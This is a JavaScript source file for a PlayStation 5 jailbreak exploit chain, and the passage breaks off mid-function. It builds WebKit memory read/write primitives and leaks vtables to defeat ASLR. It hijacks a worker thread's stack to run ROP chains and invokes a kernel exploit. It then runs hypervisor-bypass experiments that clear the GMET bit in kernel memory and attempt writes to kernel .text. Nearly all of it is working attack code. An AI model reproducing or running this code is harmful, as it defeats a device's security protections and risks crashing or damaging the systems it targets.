// @ts-check


/**
 * @typedef {Object} UserlandRW
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 */

/**
 * @typedef {Object} WebkitPrimitives
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 * 
 * @property {function(any): void} pre_chain
 * @property {function(any): Promise<void>} launch_chain
 * @property {function(any): int64} malloc_dump
 * @property {function(any, number=): int64} malloc
 * @property {function(int64, number): Uint8Array} array_from_address
 * @property {function(any): int64} stringify
 * @property {function(any, number=): string} readstr
 * @property {function(int64, string): void} writestr
 * 
 * @property {int64} libSceNKWebKitBase
 * @property {int64} libSceLibcInternalBase
 * @property {int64} libKernelBase
 * 
 * @property {any[]} nogc
 * @property {any} syscalls
 * @property {any} gadgets 
 */

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["1.00", "1.01", "1.02", "1.05", "1.10", "1.11", "1.12", "1.13", "1.14", "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
// @ts-ignore
window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
// @ts-ignore
window.fw_float = parseFloat(fw_str);

// @ts-ignore
//load offsets & webkit exploit after.
if (!supportedFirmwares.includes(fw_str)) {
    // @ts-ignore
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];

let worker = new Worker("rop_slave.js");

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} buf 
 * @param {number} family 
 * @param {number} port 
 * @param {number} addr 
 */
function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

/** 
 * @param {number} port
 * @returns {number}
 */
function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}


/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} libKernelBase 
 * @returns 
 */
function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}


/**
 * @enum {number}
 */
var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,

    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;
/**
 * 
 * @param {string} string 
 * @param {LogLevel} level 
 */
function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        lastChild.innerText = string;
        lastChild.className = elemClass;
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);

    // scroll to bottom
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;


/**
 * @param {UserlandRW} p 
 * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
 */
async function prepare(p) {
    //ASLR defeat patsy (former vtable buddy)
    let textArea = document.createElement("textarea");

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);

    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    /**
     * @param {number} sz 
     * @param {number} type 
     * @returns 
     */
    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        // @ts-ignore
        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        // nogc.push(bufView);
        /** @type {any} */
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // Make sure worker is alive?
    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker("rop_slave.js");
    
    await wait_for_worker();

    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    /** @type {WebkitPrimitives} */
    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    let pid = await chain.syscall(SYS_GETPID);

    //Sanity check
    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }

    return { p: p2, chain: chain };
}

/**
 * @param {UserlandRW} userlandRW
 * @param {boolean} wkOnly
 */
async function main(userlandRW, wkOnly = false) {
    const debug = false;

    const { p, chain } = await prepare(userlandRW);
    if (debug) await log("Chain initialized", LogLevel.DEBUG);

    async function get_local_ips() {
        // i used this as reference for the undocumented NETGETIFLIST call
        // the if_addr object is 0x3C0 bytes instead of 0x140
        // https://github.com/robots/wifimon-vita/blob/a4359efd59081fb92978b8852ca7902879429831/src/app/main.c#L17

        const SYSCALL_NETGETIFLIST = 0x07D;
        let ifaddr_count_buf = p.malloc(0x4);

        await chain.add_syscall_ret(ifaddr_count_buf, SYSCALL_NETGETIFLIST, 0, 10);
        await chain.run();

        let ifaddr_count = p.read4(ifaddr_count_buf);

        let if_addr_obj_size = 0x3C0;
        let if_addresses_length = if_addr_obj_size * ifaddr_count;
        let if_addresses = p.malloc(if_addresses_length);
        let ifaddrlist_ptr = if_addresses.add32(0x0);

        await chain.add_syscall(SYSCALL_NETGETIFLIST, ifaddrlist_ptr, ifaddr_count);
        await chain.run();

        let iplist = [];
        for (let i = 0; i < ifaddr_count; i++) {
            let adapterName = "";
            // the object starts with the adapter name
            for (let i2 = 0; i2 < 16; i2++) {
                // decode byte as text
                let char = p.read1(if_addresses.add32(if_addr_obj_size * i + i2));
                if (char == 0) {
                    break;
                }
                adapterName += String.fromCharCode(char);
            }

            let ipAddress = "";
            // from bytes 40-43 is the ip address
            for (let i2 = 40; i2 < 44; i2++) {
                ipAddress += p.read1(if_addresses.add32(if_addr_obj_size * i + i2)).toString(10) + ".";
            }
            ipAddress = ipAddress.slice(0, -1);

            iplist.push({ name: adapterName, ip: ipAddress });
        }

        return iplist;
    }

    
    let ip_list = await get_local_ips();
    let ip = ip_list.find(obj => obj.ip != "0.0.0.0");
    if (typeof ip === "undefined" || !ip.ip) {
        ip = { ip: "", name: "Offline" };
    }

    // async function probe_sb_elfldr() {
    //     let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
    //     if (fd <= 0) {
    //         return false;
    //     }

    //     let addr = p.malloc(0x10);
    //     // let localhost = aton("127.0.0.1");
    //     // alert("localhost: " + localhost.toString(16));
    //     build_addr(addr, AF_INET, htons(9021), 0x0100007F);
    //     let connect_res = (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low << 0;
    //     if (connect_res < 0) {
    //         await chain.syscall(SYS_CLOSE, fd);
    //         return false;
    //     }

    //     // send something otherwise elfldr will get stuck
    //     let write_res = (await chain.syscall(SYS_WRITE, fd, addr, 0x1)).low << 0;

    //     await chain.syscall(SYS_CLOSE, fd);
    //     return true;
    // }

    async function probe_sb_elfldr() {
        // if the bind fails, elfldr is running so return true
        let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (fd <= 0) {
            return false;
        }

        let addr = p.malloc(0x10);
        build_addr(p, addr, AF_INET, htons(9021), 0x0100007F);
        let bind_res = (await chain.syscall(SYS_BIND, fd, addr, 0x10)).low << 0;
        await chain.syscall(SYS_CLOSE, fd);
        if (bind_res < 0) {
            return true;
        }

        return false;
    }

    let is_elfldr_running = await probe_sb_elfldr();
    await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
    if (wkOnly && !is_elfldr_running) {
        let res = confirm("elfldr doesnt seem to be running and in webkit only mode it wont be loaded, continue?");
        if (!res) {
            throw new Error("Aborted");
        }
    }

    if (!wkOnly && is_elfldr_running) {
        let res = confirm("elfldr seems to be running, would you like to skip the kernel exploit, and switch to sender-only mode?");
        if (res) {
            wkOnly = true;
        }
    }

    populatePayloadsPage(wkOnly);

    // ELF store - allocated later after dump dialog to save memory during dump
    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;
    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000; // 16MB
    var elf_store = null; // Will be allocated after dump dialog

    var load_payload_into_elf_store_from_local_file = async function (filename) {
        await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
        const response = await fetch('payloads/' + filename);
        if (!response.ok) {
            throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
        }

        const data = await response.arrayBuffer();

        let byteArray;
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
            byteArray = new Uint8Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
            byteArray = new Uint16Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
            byteArray = new Uint32Array(data);
        } else {
            throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
        }

        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    if (!wkOnly) {
        var krw = await runUmtx2Exploit(p, chain, log);

        function get_kaddr(offset) {
            return krw.ktextBase.add32(offset);
        }

        ///////////////////////////////////////////////////////////////////////
        // KERNEL .TEXT DUMP - For IDA reverse engineering
        // Placed early to avoid memory pressure from elf_store allocation
        ///////////////////////////////////////////////////////////////////////

        function htons_dump(port) {
            return ((port & 0xFF) << 8) | (port >>> 8);
        }

        function aton(ip) {
            let chunks = ip.split('.');
            let addr = 0;
            for (let i = 0; i < 4; i++) {
                addr |= (parseInt(chunks[i]) << (i * 8));
            }
            return addr >>> 0;
        }

        // CONFIGURE THESE FOR YOUR SETUP
        const DUMP_NET_ADDR = aton("192.168.1.100");  // Your PC's IP
        const DUMP_NET_PORT = htons_dump(9020);        // Port for netcat

        // Log kernel base addresses first
        await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.WARN);
        await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.WARN);

        // Test read from kdataBase to verify it works
        let testVal = await krw.read8(krw.kdataBase);
        await log("[INFO] Test read from kdataBase: " + testVal, LogLevel.INFO);

        ///////////////////////////////////////////////////////////////////////
        // GMET/VMCB ANALYSIS - Search for hypervisor control data
        // Based on offsets found in kernel_data.bin analysis:
        //   - GMET format string at offset 0x3A3CCC
        //   - SVM feature table at offset 0x330BB0
        //   - GMET is bit 18 (0x12) in SVM features
        ///////////////////////////////////////////////////////////////////////

        // Known offsets from kernel_data.bin (relative to kdataBase)
        const KDATA_OFFSET_GMET_STRING = 0x3A3CCC;      // "EnableGMET:%d" format string
        const KDATA_OFFSET_SVM_FEATURE_TABLE = 0x330BB0; // SVM feature name table
        const KDATA_OFFSET_VM_PMAP = 0x409132;          // vm.pmap.pcid_enabled sysctl

        // =========================================================================
        // WRITABLE POINTER EXPLOIT RESEARCH
        //
        // CONFIRMED FINDINGS:
        // - Writable region: kdataBase + 0x0 to ~0xF000 (~60KB)
        // - Write-protected: 0x10000+ (apic_ops, sysentvec, etc.)
        // - Writable kernel pointer found at: kdataBase + 0x4a48
        // - Pointer value: ~ktextBase + 0x13b000
        // =========================================================================
        {
            await log("========== WRITABLE POINTER EXPLOIT ==========", LogLevel.SUCCESS);
            await log("[INFO] Writable region: kdataBase + 0x0 to ~0xF000", LogLevel.INFO);
            await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.INFO);
            await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.INFO);

            // Dump context around 0x4a48 to understand structure
            await log("[CONTEXT] Dumping 0x4a00 - 0x4b00:", LogLevel.WARN);
            for (let off = 0x4a00; off < 0x4b00; off += 0x10) {
                let v1 = await krw.read8(krw.kdataBase.add32(off));
                let v2 = await krw.read8(krw.kdataBase.add32(off + 8));
                let marker = (off === 0x4a40) ? " <-- 0x4a48 here" : "";
                await log("  0x" + off.toString(16) + ": " + v1 + " | " + v2 + marker, LogLevel.INFO);
            }

            // Read the writable pointer at 0x4a48
            let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
            let ptrOffset = ptr4a48.low - krw.ktextBase.low;

            await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.SUCCESS);
            await log("[0x4a48] Points to: ktextBase + 0x" + ptrOffset.toString(16), LogLevel.INFO);
            await log("[0x4a48] Target contains ZEROS - not a function pointer", LogLevel.WARN);

            // Since 0x4a48 points to zeros, look for OTHER interesting data
            await log("[SCAN] Looking for ALL kernel pointers in writable region...", LogLevel.WARN);

            let allPointers = [];
            for (let off = 0; off < 0x10000; off += 8) {
                let val = await krw.read8(krw.kdataBase.add32(off));

                // Check if it's a kernel pointer (high bits set)
                if (val.hi === 0xffffffff && val.low !== 0xffffffff) {
                    // Filter out obvious masks
                    let lowHex = val.low.toString(16).padStart(8, '0');
                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;

                    allPointers.push({ offset: off, value: val });
                }
            }

            await log("[SCAN] Found " + allPointers.length + " kernel pointers total", LogLevel.SUCCESS);

            // Categorize pointers
            for (let ptr of allPointers) {
                let textOff = ptr.value.low - krw.ktextBase.low;
                let dataOff = ptr.value.low - krw.kdataBase.low;

                let category = "";
                if (textOff >= 0 && textOff < 0x2000000) {
                    category = "-> .text + 0x" + textOff.toString(16);
                } else if (dataOff >= 0 && dataOff < 0x2000000) {
                    category = "-> .data + 0x" + dataOff.toString(16);
                } else {
                    category = "(other region)";
                }

                await log("[PTR] 0x" + ptr.offset.toString(16) + ": " + ptr.value + " " + category, LogLevel.INFO);
            }

            // =========================================================================
            // SVM CACHE ANALYSIS - Check multiple potential offsets
            // =========================================================================

            await log("========== SVM CACHE ANALYSIS ==========", LogLevel.SUCCESS);

            // Check both potential SVM cache locations
            const SVM_OFFSETS = [0x4bf0, 0x4dcc];
            let svmLocations = [];

            for (let offset of SVM_OFFSETS) {
                let val = await krw.read4(krw.kdataBase.add32(offset));
                let hasGmet = (val & 0x40000) !== 0;
                await log("[SVM] 0x" + offset.toString(16) + ": 0x" + val.toString(16) +
                    (val === 0x740f12 ? " <- GMET SET" : (val === 0x700f12 ? " <- GMET CLEAR" : "")),
                    hasGmet ? LogLevel.WARN : LogLevel.SUCCESS);
                if (val === 0x740f12 || val === 0x700f12) {
                    svmLocations.push({ offset, val, hasGmet });
                }
            }

            // Scan for 0x740f12 pattern in writable region
            await log("[SCAN] Searching for SVM cache value 0x740f12 in 0x0-0x10000...", LogLevel.INFO);
            let svmMatches = [];
            for (let off = 0; off < 0x10000; off += 4) {
                let val = await krw.read4(krw.kdataBase.add32(off));
                if (val === 0x740f12 || val === 0x700f12) {
                    svmMatches.push({ offset: off, val });
                    await log("[SCAN] Found at 0x" + off.toString(16) + ": 0x" + val.toString(16), LogLevel.SUCCESS);
                }
            }
            await log("[SCAN] Found " + svmMatches.length + " SVM cache matches", LogLevel.INFO);

            // =========================================================================
            // MANUFACTURING MODE SEARCH
            // =========================================================================

            await log("========== MANUFACTURING MODE SEARCH ==========", LogLevel.SUCCESS);

            // Look for potential manumode flags (small integers 0-3 that could be mode flags)
            // Known offsets from kernel_data.bin analysis might differ in live memory
            // Search for characteristic patterns

            // Dump the region around where manumode might be (based on string offsets)
            // In kernel_data.bin: manumode at 0x43bf5b, curr_manumode at 0x428c67
            // These are string offsets, not data offsets - need to find actual flag

            await log("[MANU] Searching for mode flags in writable region...", LogLevel.INFO);

            // Look for small values that could be mode flags near interesting offsets
            let manuCandidates = [];
            for (let off = 0; off < 0x1000; off += 4) {
                let val = await krw.read4(krw.kdataBase.add32(off));
                // Look for values 0, 1, 2, 3 which are typical mode flags
                if (val >= 0 && val <= 3) {
                    manuCandidates.push({ offset: off, val });
                }
            }
            await log("[MANU] Found " + manuCandidates.length + " potential mode flags in first 0x1000", LogLevel.INFO);

            // =========================================================================
            // GMET BYPASS TEST MENU
            // =========================================================================

            let testChoice = confirm(
                "HYPERVISOR BYPASS TESTS\n\n" +
                "SVM cache matches: " + svmMatches.length + "\n" +
                "Mode flag candidates: " + manuCandidates.length + "\n\n" +
                "OK = Run GMET clear test on all SVM locations\n" +
                "Cancel = Skip to next section"
            );

            if (testChoice && svmMatches.length > 0) {
                await log("[TEST] Clearing GMET bit at all SVM cache locations...", LogLevel.WARN);

                for (let match of svmMatches) {
                    if (match.val === 0x740f12) {
                        let newVal = match.val & ~0x40000; // Clear bit 18
                        await log("[TEST] 0x" + match.offset.toString(16) + ": 0x740f12 -> 0x" + newVal.toString(16), LogLevel.WARN);
                        await krw.write4(krw.kdataBase.add32(match.offset), newVal);

                        let verify = await krw.read4(krw.kdataBase.add32(match.offset));
                        await log("[TEST] Verify: 0x" + verify.toString(16), LogLevel.INFO);
                    }
                }

                await log("[TEST] All SVM caches modified!", LogLevel.SUCCESS);
                await log("[TEST] Put PS5 to REST MODE, wake, run exploit again", LogLevel.WARN);

                // Check if any location already has GMET clear
                let anyCleared = svmMatches.some(m => m.val === 0x700f12);
                if (anyCleared) {
                    let tryWrite = confirm(
                        "GMET ALREADY CLEAR!\n\n" +
                        "At least one SVM cache has GMET bit cleared.\n" +
                        "Try writing to kernel .text?\n\n" +
                        "OK = Test .text write\n" +
                        "Cancel = Skip"
                    );

                    if (tryWrite) {
                        await log("[.TEXT] Reading byte from ktextBase...", LogLevel.WARN);
                        let textByte = await krw.read1(krw.ktextBase);
                        await log("[.TEXT] Read: 0x" + textByte.toString(16), LogLevel.INFO);

                        await log("[.TEXT] Writing same byte back...", LogLevel.WARN);
                        try {
                            await krw.write1(krw.ktextBase, textByte);
                            await log("[.TEXT] WRITE SUCCEEDED! GMET/NPT BYPASSED!", LogLevel.SUCCESS);
                        } catch (e) {
                            await log("[.TEXT] Write failed (expected if HV ignores cache): " + e, LogLevel.ERROR);
                        }
                    }
                }
            }

            // =========================================================================
            // MANUFACTURING MODE TEST
            // =========================================================================

            let manuTest = confirm(
                "MANUFACTURING MODE TEST\n\n" +
                "Try setting mode flags to enable manu mode?\n" +
                "This will try writing value 1 to potential\n" +
                "mode flag locations in writable memory.\n\n" +
                "WARNING: May cause instability!\n\n" +
                "OK = Try manu mode flags\n" +
                "Cancel = Skip"
            );

            if (manuTest) {
                await log("[MANU] Attempting to set manufacturing mode flags...", LogLevel.WARN);

                // Try some specific offsets that might be mode flags
                // These are speculative based on typical kernel data layout
                const MANU_TEST_OFFSETS = [0x0, 0x4, 0x8, 0x10, 0x100, 0x200];

                for (let off of MANU_TEST_OFFSETS) {
                    let oldVal = await krw.read4(krw.kdataBase.add32(off));
                    await log("[MANU] 0x" + off.toString(16) + " current: " + oldVal, LogLevel.INFO);
                }

                // Don't actually write without more research - too risky
                await log("[MANU] Skipping writes - need more research on flag locations", LogLevel.WARN);
                await log("[MANU] Use kernel dump to find actual manumode variable offset", LogLevel.INFO);
            }

            // =========================================================================
            // .TEXT WRITE TEST (direct attempt)
            // =========================================================================

            let directTextTest = confirm(
                "DIRECT .TEXT WRITE TEST\n\n" +
                "Try writing to kernel .text directly?\n" +
                "(Will likely crash if GMET/NPT active)\n\n" +
                "OK = Try .text write\n" +
                "Cancel = Skip"
            );

            if (directTextTest) {
                await log("[.TEXT] Direct write test...", LogLevel.WARN);
                let textByte = await krw.read1(krw.ktextBase);
                await log("[.TEXT] Read ktextBase[0]: 0x" + textByte.toString(16), LogLevel.INFO);

                try {
                    await krw.write1(krw.ktextBase, textByte);
                    await log("[.TEXT] WRITE SUCCEEDED! HV BYPASSED!", LogLevel.SUCCESS);
                    alert("SUCCESS! Kernel .text is now writable!");
                } catch (e) {
                    await log("[.TEXT] Write failed: " + e, LogLevel.ERROR);
                }
            }

            // =========================================================================
            // RESEARCH ANALYSIS SUITE
            // Comprehensive analysis for HV bypass research
            // =========================================================================

            let runResearch = confirm(
                "HV BYPASS RESEARCH SUITE\n\n" +
                "Run comprehensive analysis?\n" +
                "- Dump calibration (verify offsets)\n" +
                "- Full pointer map (0x0-0x10000)\n" +
                "- Extended SVM cache scan\n" +
                "- Mystery flag analysis\n" +
                "- .text read attempt\n\n" +
                "OK = Run analysis\n" +
                "Cancel = Skip"
            );

            if (runResearch) {
                // ===== CALIBRATION =====
                await log("========== DUMP CALIBRATION ==========", LogLevel.SUCCESS);
                await log("kdataBase: " + krw.kdataBase, LogLevel.INFO);
                await log("ktextBase: " + krw.ktextBase, LogLevel.INFO);

                let cal_svm1 = await krw.read4(krw.kdataBase.add32(0x4bf0));
                let cal_svm2 = await krw.read4(krw.kdataBase.add32(0x4dcc));
                let cal_ptr = await krw.read8(krw.kdataBase.add32(0x4a48));

                await log("Calibration values (search in kernel_data.bin):", LogLevel.WARN);
                await log("  0x4bf0: 0x" + cal_svm1.toString(16) + " (SVM cache 1)", LogLevel.INFO);
                await log("  0x4dcc: 0x" + cal_svm2.toString(16) + " (SVM cache 2)", LogLevel.INFO);
                await log("  0x4a48: " + cal_ptr + " (writable pointer)", LogLevel.INFO);

                // ===== FULL POINTER MAP =====
                await log("========== FULL POINTER MAP (0x0-0x10000) ==========", LogLevel.SUCCESS);

                let textPtrs = [];
                let dataPtrs = [];
                let otherPtrs = [];

                for (let off = 0; off < 0x10000; off += 8) {
                    let val = await krw.read8(krw.kdataBase.add32(off));

                    if (val.hi !== 0xffffffff) continue;

                    // Filter out obvious masks
                    let lowHex = val.low.toString(16).padStart(8, '0');
                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;

                    let textOff = val.low - krw.ktextBase.low;
                    let dataOff = val.low - krw.kdataBase.low;

                    if (textOff >= 0 && textOff < 0x2000000) {
                        textPtrs.push({off, textOff, val});
                    } else if (dataOff >= 0 && dataOff < 0x2000000) {
                        dataPtrs.push({off, dataOff, val});
                    } else {
                        otherPtrs.push({off, val});
                    }
                }

                await log("Found " + textPtrs.length + " .text pointers", LogLevel.SUCCESS);
                await log("Found " + dataPtrs.length + " .data pointers", LogLevel.INFO);
                await log("Found " + otherPtrs.length + " other pointers", LogLevel.INFO);

                // Log .text pointers (most interesting)
                await log("--- .text pointers (potential code refs) ---", LogLevel.WARN);
                for (let p of textPtrs) {
                    await log("  0x" + p.off.toString(16) + " -> .text+0x" + p.textOff.toString(16), LogLevel.WARN);
                }

                // ===== EXTENDED SVM CACHE SCAN =====
                await log("========== EXTENDED SVM CACHE SCAN ==========", LogLevel.SUCCESS);
                let svmMatches = [];
                for (let off = 0; off < 0x20000; off += 4) {
                    let val = await krw.read4(krw.kdataBase.add32(off));
                    if (val === 0x740f12 || val === 0x700f12) {
                        svmMatches.push({off, val});
                        let gmet = (val & 0x40000) !== 0;
                        await log("[SVM] 0x" + off.toString(16) + ": 0x" + val.toString(16) +
                            " (GMET " + (gmet ? "SET" : "CLEAR") + ")", LogLevel.SUCCESS);
                    }
                }
                await log("Total SVM cache matches: " + svmMatches.length, LogLevel.INFO);

                // ===== MYSTERY FLAG ANALYSIS =====
                await log("========== MYSTERY FLAG ANALYSIS ==========", LogLevel.SUCCESS);
                const MYSTERY_OFFSET = 0xD11D08;

                // Check if offset is readable (might be outside our dump range)
                try {
                    let mysteryVal = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
                    await log("Mystery flag at 0xD11D08: 0x" + mysteryVal.toString(16), LogLevel.WARN);

                    // Read surrounding context
                    await log("Context around 0xD11D00:", LogLevel.INFO);
                    for (let ctx = 0xD11D00; ctx < 0xD11D20; ctx += 4) {
                        let ctxVal = await krw.read4(krw.kdataBase.add32(ctx));
                        let marker = (ctx === MYSTERY_OFFSET) ? " <-- MYSTERY FLAG" : "";
                        await log("  0x" + ctx.toString(16) + ": 0x" + ctxVal.toString(16) + marker, LogLevel.INFO);
                    }
                } catch (e) {
                    await log("Mystery flag offset 0xD11D08 not accessible: " + e, LogLevel.ERROR);
                }

                // ===== .TEXT READ ATTEMPT =====
                await log("========== .TEXT READ ATTEMPT ==========", LogLevel.SUCCESS);
                try {
                    let textVal = await krw.read8(krw.ktextBase);
                    await log("[!!!] .TEXT IS READABLE: " + textVal, LogLevel.SUCCESS);
